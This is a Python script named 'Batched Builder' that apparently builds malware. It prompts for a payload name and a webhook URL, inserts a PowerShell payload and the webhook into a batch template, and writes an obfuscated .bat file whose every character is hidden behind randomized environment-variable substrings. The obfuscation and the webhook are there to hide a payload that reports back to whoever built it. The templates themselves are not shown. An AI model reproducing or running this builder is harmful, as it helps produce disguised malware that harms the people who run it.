import random, numpy, os
from colored import fg

class BatchedBuilder:
    def __init__(self):
        pass
    
    def print_banner(self):
        os.system('cls && title Batched Builder' if os.name == 'nt' else 'clear')
        print(f'''
            {fg(124)}╔╗ ╔═╗╔╦╗╔═╗╦ ╦╔═╗╔╦╗
            {fg(125)}╠╩╗╠═╣ ║ ║  ╠═╣║╣  ║║
            {fg(126)}╚═╝╩ ╩ ╩ ╚═╝╩ ╩╚═╝═╩╝ github.com/its-vichy{fg(15)}
        ''')

    def obfuscate(self, Il, code, alphabet, sets_num, min_name_length):
        
        mixed_alphabet = ''.join(random.sample(alphabet, len(alphabet)))

        alphabets = []
        sets = []
        for x in range(sets_num):
            name = ''.join(random.choices(Il, k=min_name_length))
            while name in sets:
                min_name_length += 1
                name = ''.join(random.choices(Il, k=min_name_length))
            sets.append(name)

        for l in numpy.array_split(list(mixed_alphabet), sets_num):
            li = []
            for i in l:
                li.append(i)
            alphabets.append(li)

        new = '@echo off\n'
        for x in range(len(sets)):
            new = new + 'Set ' + sets[x] + '=' + ''.join(alphabets[x]) + '\n'
        new = new + 'cls\n\n'

        for c in code:
            last = False
            for x in range(len(alphabets)):
                if c in alphabets[x]:
                    if last:
                        new = new[:-1]
                    new = new + '%' + sets[x] + ':~' + str(''.join(alphabets[x]).find(c)) + ',1%'
                    break
                else:
                    if not last:
                        new = new + c
                        last = True

        return new

    def build(self, name: str, hook: str):
        powershell = ''

        with open('./Files/powershell.txt', 'r+') as powershell_file:
            for line in powershell_file:
                line= line.split('\n')[0]
                
                if line != '':
                    powershell += f'echo {line} >> Batched.ps1\n'

        payload = open('./Files/batch.txt', 'r+').read().replace('??powershell_payload??', powershell).replace('??hook_url??', hook).replace('??file_name??', name)
        open(f'./{name}.bat', 'w').write(self.obfuscate(['_BATCHED_'], payload, 'AbCdEfGhIjKlMnOpQrStUvWxYz0123456789@?!', 10, 1))

    def main(self):
        self.print_banner()
        name = input(f'[{fg(127)}>{fg(15)}] Payload Name: ')
        hook = input(f'[{fg(127)}>{fg(15)}] Webhook: ')
        self.build(name, hook)

BatchedBuilder().main()